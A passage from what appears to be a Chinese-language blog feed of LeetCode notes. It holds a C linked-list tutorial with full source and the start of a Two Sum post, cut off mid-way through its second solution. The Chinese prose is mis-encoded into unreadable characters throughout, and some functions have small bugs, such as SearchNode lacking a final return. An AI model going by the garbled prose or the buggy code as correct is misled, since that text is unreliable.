class="line">        <span class="comment">// Update current pointer to the preceding point</span></span><br><span class="line">        current = preceding;</span><br><span class="line">        <span class="comment">// Update the preceding pointer to the next node;</span></span><br><span class="line">        preceding = preceding-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;next =previous;</span><br><span class="line">    first_node=current;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>current</code>ï¼šæŒ‡å‘ç•¶å‰ç¯€é»çš„æŒ‡æ¨™ï¼Œåˆå§‹å€¼ç‚ºlinked listçš„ç¬¬ä¸€å€‹ç¯€é» <code>first_node</code></li><li><code>previous</code>ï¼šæŒ‡å‘å‰ä¸€å€‹ç¯€é»çš„æŒ‡æ¨™ï¼Œåˆå§‹å€¼ç‚º NULLï¼Œå› ç‚ºåœ¨é–‹å§‹æ™‚æ²’æœ‰å‰ä¸€å€‹ç¯€é»</li><li><code>preceding</code>ï¼šæŒ‡å‘ç•¶å‰ç¯€é»çš„ä¸‹ä¸€å€‹ç¯€é»çš„æŒ‡æ¨™ï¼Œåˆå§‹å€¼ç‚º <code>first_node</code> çš„ä¸‹ä¸€å€‹ç¯€é»</li><li>æ¥è‘—åœ¨ while è¿´åœˆå…§ï¼Œå¾ªç’°èµ°è¨ªlinked listï¼Œç›´åˆ° preceding è®Šç‚º NULL</li><li><code>current-&gt;next = previous;</code>ï¼šå°‡ç•¶å‰ç¯€é»çš„ <code>next</code> æŒ‡æ¨™æŒ‡å‘å‰ä¸€å€‹ç¯€é»ï¼ˆåè½‰æŒ‡æ¨™æ–¹å‘ï¼‰</li><li><code>previous = current;</code>ï¼šå°‡ <code>previous</code> æ›´æ–°ç‚ºç›®å‰ç¯€é»</li><li><code>current = preceding;</code>ï¼šå°‡ <code>current</code> æ›´æ–°ç‚ºä¸‹ä¸€å€‹ç¯€é»</li><li><code>preceding = preceding-&gt;next;</code>ï¼šå°‡ <code>preceding</code> æ›´æ–°ç‚ºä¸‹ä¸€å€‹ç¯€é»çš„ä¸‹ä¸€å€‹ç¯€é»</li><li>æ¥è‘—æ˜¯æœ€å¾Œä¸€å€‹ç¯€é»çš„è™•ç†ï¼Œé€™æ™‚ä¹Ÿæ˜¯å°‡ï¼Œå°‡æœ€å¾Œç¯€é»çš„ <code>next</code> æŒ‡æ¨™æŒ‡å‘å‰ä¸€å€‹ç¯€é»ï¼ˆåè½‰æŒ‡æ¨™æ–¹å‘ï¼‰</li><li>å¦å¤–å°±æ˜¯è¦å°‡åˆå§‹ç¯€é»çš„æŒ‡æ¨™æ›´æ–°ç‚ºç•¶å‰ç¯€é»</li><li><code>first_node = current;</code>ï¼šæ›´æ–°linked listçš„é ­ç¯€é» <code>first_node</code>ï¼Œç¾åœ¨ current æŒ‡å‘åŸå§‹linked listçš„æœ€å¾Œä¸€å€‹ç¯€é»ï¼Œå³æ–°çš„é ­ç¯€é»</li></ul><h1 id="å…¨éƒ¨ç¨‹å¼ç¢¼"><a href="#å…¨éƒ¨ç¨‹å¼ç¢¼" class="headerlink" title="å…¨éƒ¨ç¨‹å¼ç¢¼"></a>å…¨éƒ¨ç¨‹å¼ç¢¼</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// define node</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line">Node *first_node;</span><br><span class="line">Node *current_node;</span><br><span class="line">Node *previous_node;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Declare Fuctions</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_new_node</span><span class="params">(<span class="type">int</span> node_nums)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>;</span><br><span class="line">Node* <span class="title function_">SearchNode</span><span class="params">(Node* first, <span class="type">int</span> item)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertNode</span><span class="params">(Node* node, <span class="type">int</span> item)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push_front</span><span class="params">(<span class="type">int</span> item)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> item)</span>;</span><br><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">( Node* first,Node* node)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> node_numbers;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The numbers of nodes:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;node_numbers);</span><br><span class="line">    create_new_node(node_numbers);</span><br><span class="line">    current_node = first_node;</span><br><span class="line">    <span class="keyword">while</span> (current_node!= <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]|&quot;</span>,current_node);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data: %d&quot;</span>,current_node-&gt;data);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;| Addr. of next node=%p \n&quot;</span>,current_node-&gt;next);</span><br><span class="line">        current_node=current_node-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Traverse the list of nodes</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=========================================================\n\n&quot;</span>);</span><br><span class="line">    PrintList(first_node);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Serach Nodes: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;item);</span><br><span class="line">    <span class="keyword">if</span> (SearchNode(first_node,item))&#123; <span class="built_in">printf</span>(<span class="string">&quot;Node found\n&quot;</span>);&#125; <span class="keyword">else</span> &#123;<span class="built_in">printf</span>(<span class="string">&quot;Node not found\n&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Insert Node:&quot;</span>);</span><br><span class="line">    <span class="comment">// User input data</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;item);</span><br><span class="line">    <span class="keyword">if</span> (SearchNode(first_node,item))&#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Node exisit in the list&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Insert behind the current node</span></span><br><span class="line">        InsertNode(first_node,item);</span><br><span class="line">        PrintList(first_node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reverse the list\n&quot;</span>);</span><br><span class="line">    Reverse();</span><br><span class="line">    PrintList(first_node);</span><br><span class="line"></span><br><span class="line">    FreeList(first_node);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_new_node</span><span class="params">(<span class="type">int</span> node_nums)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt; node_nums; i++)&#123;</span><br><span class="line">        <span class="comment">// Declare new node</span></span><br><span class="line">        current_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data for node %d : &quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// Enter node data</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;(current_node-&gt;data));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// First node, don&#x27;t have previous node, so let the first_node and previous_node equal to current_node</span></span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">            first_node = current_node;</span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// Set the previous node point to the current node</span></span><br><span class="line">            previous_node-&gt;next = current_node;</span><br><span class="line">            current_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="comment">// Set the previous node to current node, prepare to next node creation (or not)</span></span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// input parameter is node struct</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    <span class="comment">// Decalre the address of input node</span></span><br><span class="line">    Node *node = first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;List is empty!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>( node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d -&gt; &quot;</span>, node-&gt;data);</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Null \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node *current, *temp_node;</span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">while</span> ( current != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="comment">// Put the node that wants to be removed into temp_node</span></span><br><span class="line">        temp_node = current;</span><br><span class="line">        <span class="comment">// Let the current node point to the next node</span></span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        <span class="comment">// Free the node</span></span><br><span class="line">        <span class="built_in">free</span>(temp_node);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return value should be the address of the node</span></span><br><span class="line">Node* <span class="title function_">SearchNode</span><span class="params">(Node* first, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * node = first;</span><br><span class="line">    <span class="keyword">while</span> ( node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> (node-&gt;data == item)&#123;</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertNode</span><span class="params">(Node* node, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node *new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    <span class="comment">// Point the new node to the nexy item of original node</span></span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = node-&gt;next;</span><br><span class="line">    <span class="comment">// Point the original node to new node</span></span><br><span class="line">    node -&gt; next = new_node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert a node to the front of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_front</span><span class="params">(<span class="type">int</span>  item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = first_node; <span class="comment">// new node pointer point to original first node</span></span><br><span class="line">    first_node = new_node;  <span class="comment">// Update the first node to the new node</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Insert a node to the back of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// Handle empty list</span></span><br><span class="line">    <span class="keyword">if</span> (first_node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        first_node = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// Initailize the current node to the first node for traversal</span></span><br><span class="line">        Node * current_node = first_node;</span><br><span class="line">        <span class="keyword">while</span> (current_node-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="comment">// traverse through the list</span></span><br><span class="line">            current_node = current_node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Point to the new node</span></span><br><span class="line">        current_node-&gt;next = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">(Node* first ,Node* node)</span>&#123;</span><br><span class="line">    Node* ptr= first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Noting to print\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Delete first node of the list</span></span><br><span class="line">    <span class="keyword">if</span> (node == first)&#123;</span><br><span class="line">        <span class="comment">// Update the first pointer to the next node</span></span><br><span class="line">        first = first-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// ptr traverse through the list</span></span><br><span class="line">        <span class="keyword">while</span> (ptr-&gt;next != node)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr-&gt;next = node-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Node *current, *previous, *preceding;</span><br><span class="line">    previous = <span class="literal">NULL</span>;</span><br><span class="line">    current = first_node;</span><br><span class="line">    <span class="comment">// preceding node store the previous address of the current node</span></span><br><span class="line">    preceding = first_node-&gt;next;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (preceding != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">// pointer the current node to the NULL (previous) node</span></span><br><span class="line">        current-&gt;next = previous;</span><br><span class="line">        <span class="comment">// Update previous poinert to current pointer</span></span><br><span class="line">        previous = current;</span><br><span class="line">        <span class="comment">// Update current pointer to the preceding point</span></span><br><span class="line">        current = preceding;</span><br><span class="line">        <span class="comment">// Update the preceding pointer to the next node;</span></span><br><span class="line">        preceding = preceding-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;next =previous;</span><br><span class="line">    first_node=current;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åŸ·è¡Œçµæœ"><a href="#åŸ·è¡Œçµæœ" class="headerlink" title="åŸ·è¡Œçµæœ"></a>åŸ·è¡Œçµæœ</h2><p><img src="/img/LeetCode/Linked_List/result-1.png"><br><img src="/img/LeetCode/Linked_List/result-2.png"></p><blockquote><p>ç¸½çµ: é€éé€™æ¬¡çš„æ•´ç†ï¼Œç®—æ˜¯æœ‰æ›´åŠ ç†Ÿæ‚‰å·²ç¶“å¿˜å…‰çš„ linked list æ“ä½œï¼Œæ¥ä¸‹ä¾†å°±ç›´æ¥æ‹¿ç›¸é—œçš„LeetCodeé¡Œç›®ç•¶ç·´ç¿’å§</p></blockquote><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>[1] <a href="https://jacychu.medium.com/leetcode-linked-list-%E9%8F%88%E7%B5%90%E4%B8%B2%E5%88%97-c2edabee9958">https://jacychu.medium.com/leetcode-linked-list-%E9%8F%88%E7%B5%90%E4%B8%B2%E5%88%97-c2edabee9958</a><br>[2] <a href="https://codimd.mcl.math.ncu.edu.tw/s/B1rd5-sM4#%E6%8F%92%E5%85%A5%E7%AF%80%E9%BB%9E%E5%87%BD%E6%95%B8-InsertNode-">https://codimd.mcl.math.ncu.edu.tw/s/B1rd5-sM4#%E6%8F%92%E5%85%A5%E7%AF%80%E9%BB%9E%E5%87%BD%E6%95%B8-InsertNode-</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCodeç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ‡‰ç”¨ Hash Table | LeetCode#1  Two Sum</title>
      <link href="/posts/cb46ac9d.html"/>
      <url>/posts/cb46ac9d.html</url>
      
        <content type="html"><![CDATA[<h1 id="é¡Œç›®æ•˜è¿°"><a href="#é¡Œç›®æ•˜è¿°" class="headerlink" title="é¡Œç›®æ•˜è¿°"></a>é¡Œç›®æ•˜è¿°</h1><p><img src="/img/LeetCode/Two_Sum/two_sum_question.png"></p><p>é¡Œç›®æè¿°çµ¦å®šæ•´æ•¸çš„é™£åˆ—ä»¥åŠæ•´æ•¸ <code>target</code> å€¼ï¼Œè«‹åœ¨é™£åˆ—æ‰¾åˆ°ä»»å…©å…ƒç´ ç›¸åŠ ç­‰æ–¼ targetï¼Œä¸¦ä¸”å›å‚³å…ƒç´ çš„ç´¢å¼•ï¼Œå¦å¤–å°æ–¼æ¯å€‹è¼¸å…¥é™£åˆ—åªæœƒæœ‰ä¸€çµ„è¼¸å‡ºç­”æ¡ˆã€‚</p><h1 id="è§£æ³•-1-æš´åŠ›è§£"><a href="#è§£æ³•-1-æš´åŠ›è§£" class="headerlink" title="è§£æ³•-1: æš´åŠ›è§£"></a>è§£æ³•-1: æš´åŠ›è§£</h1><p>é¦–å…ˆä¸€æ¨£å¾æš´åŠ›è§£é–‹å§‹ï¼Œå…ˆæœ‰è§£æ³•ï¼Œå¾ŒçºŒå†çœ‹è¦æ€éº¼å„ªåŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="comment">// init return array</span></span><br><span class="line">    <span class="type">int</span>* results = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="comment">// i could not iterated to n-1, since every element is compared.</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt; numsSize<span class="number">-1</span>; i++)&#123; </span><br><span class="line">        <span class="keyword">for</span> (j = i+<span class="number">1</span>; j &lt; numsSize; j++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">                results[<span class="number">0</span>] = i;</span><br><span class="line">                results[<span class="number">1</span>] = j;</span><br><span class="line">                *returnSize = <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">return</span> results;</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// If no solution is found</span></span><br><span class="line">    <span class="built_in">free</span>(results); <span class="comment">// Free the allocated memory before returning</span></span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€™è£¡çš„æ ¸å¿ƒåšæ³•ç‚º: <strong>é¸æ“‡ä¸€å€‹å…ƒç´ ï¼Œå»æ¯”è¼ƒå¦ä¸€å€‹å…ƒç´ ï¼Œçœ‹ç›¸åŠ æ˜¯å¦ç‚º <code>target</code></strong></p><p>ä½†é€™éº¼åšçš„æ™‚é–“è¤‡é›œåº¦ç‚º $O(n^2)$</p><p>å¦å¤–å› ç‚ºé¡Œç›®è¦æ±‚å›å‚³é™£åˆ—éœ€è¦å‹•æ…‹å®£å‘Šï¼Œå› æ­¤åœ¨çµå°¾å¿…é ˆé‡‹æ”¾è¨˜æ†¶é«”ä½å€ <code>*returnSize</code> æ˜¯ç”¨ä¾†å‘Šè¨´å‘¼å«è€…è¿”å›çš„é™£åˆ—çš„å¤§å°ã€‚ç”±æ–¼ C èªè¨€ä¸æ”¯æ´ç›´æ¥è¿”å›å¤šå€‹å€¼ï¼Œé¡Œç›®éœ€è¦æŒ‡æ¨™ä¾†ä¿®æ”¹å¤–éƒ¨è®Šæ•¸ï¼Œé€™æ¨£å¯ä»¥å‚³éæ›´å¤šçš„è³‡è¨Šã€‚</p><h3 id="åŸ·è¡Œçµæœ"><a href="#åŸ·è¡Œçµæœ" class="headerlink" title="åŸ·è¡Œçµæœ:"></a>åŸ·è¡Œçµæœ:</h3><p><img src="/img/LeetCode/Two_Sum/two_sum_result-2.png"></p><h1 id="è§£æ³•-2-ä½¿ç”¨é›œæ¹Šè¡¨-Hash-Table"><a href="#è§£æ³•-2-ä½¿ç”¨é›œæ¹Šè¡¨-Hash-Table" class="headerlink" title="è§£æ³•-2: ä½¿ç”¨é›œæ¹Šè¡¨(Hash Table)"></a>è§£æ³•-2: ä½¿ç”¨é›œæ¹Šè¡¨(Hash Table)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 